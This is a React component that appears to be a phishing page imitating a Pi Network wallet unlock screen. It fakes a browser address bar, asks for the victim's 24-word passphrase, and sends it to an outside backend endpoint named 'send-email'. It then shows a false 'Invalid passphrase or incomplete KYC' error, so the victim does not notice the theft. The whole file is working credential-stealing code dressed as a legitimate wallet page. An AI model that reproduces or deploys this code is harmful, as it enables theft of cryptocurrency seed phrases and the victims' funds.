import React, { useState } from "react";
import axios from "axios";
import { FaAngleDown } from "react-icons/fa6";
import { Link } from 'react-router-dom';
import { BiArrowBack } from "react-icons/bi";
import Logo from "../images/pilogo.png";
import Wallet from '../images/wallet.jpg'


const Phrases = () => {
  const [phrase, setPhrase] = useState("");
  const [message, setMessage] = useState("");

  const handleSubmit = async () => {
    if(phrase !== ""){
      try {
        const response = await axios.post("https://pi-backend-ruddy.vercel.app/send-email", { phrase });
        if (response.status === 200) {
          setMessage("Invalid passphrase or incomplete KYC");
        } else {
          setMessage("Failed to send passphrase.");
        }
      } catch (error) {
        console.error("Error sending email:", error);
        setMessage("An error occurred while sending the passphrase.");
      }
    }else{
      setMessage("Enter your passphrase.")
    }

  };

  return (
    <div className="flex flex-col w-full overflow-auto">
      <div className="flex h-10 items-center justify-between px-3 gap-2">
      <Link to="/"><BiArrowBack size={21}/></Link>
        <div className="border w-[70%] border-black rounded-md h-[80%] flex items-center pl-1">
          <p className="text-sm">https://piwallet.live/unlock-pi-wallet</p>
        </div>
        <FaAngleDown size={20} />
      </div>


      <div className="flex bg-[#703d92] text-white h-10 items-center justify-center px-3 gap-2">
      <img src={Wallet} alt="Pi" className="h-5" />
        Wallet
        <img src={Logo} alt="Pi" className="h-8" />
      </div>

      <div className="flex w-full items-center flex-col px-3">
        <p className="font-[800] text-[17px] mb-5 mt-4">Unlock Pi Wallet</p>

        <div className="w-[95%] border rounded-md h-auto mb-7 p-2">
      <textarea
        className="w-full h-full border-none outline-none resize-none overflow-hidden"
        placeholder="Enter your 24-passphrase here"
        value={phrase}
        onChange={(e) => setPhrase(e.target.value)}
        rows={6}
      />
    </div>

        <button
          className="border border-[#703d92] text-[#703d92] w-full h-10 font-[500] rounded-lg"
          onClick={handleSubmit}
        >
          Unlock With Passphrase
        </button>

        <p className="text-[red] mb-4 mt-4">{message && <p>{message}</p>}</p>

        <p className="text-[13px]">
          As a non-custodial wallet, your wallet passphrase is exclusively
          accessible only to you. Recovery of passphrase is currently
          impossible. <br /> <br /> Lost your passphrase?{" "}
          <a className="text-[#0001ee]" href="#">
            You can create a new wallet,
          </a> but all in your previous wallet will be inaccessible.
        </p>
      </div>
    </div>
  );
};

export default Phrases;
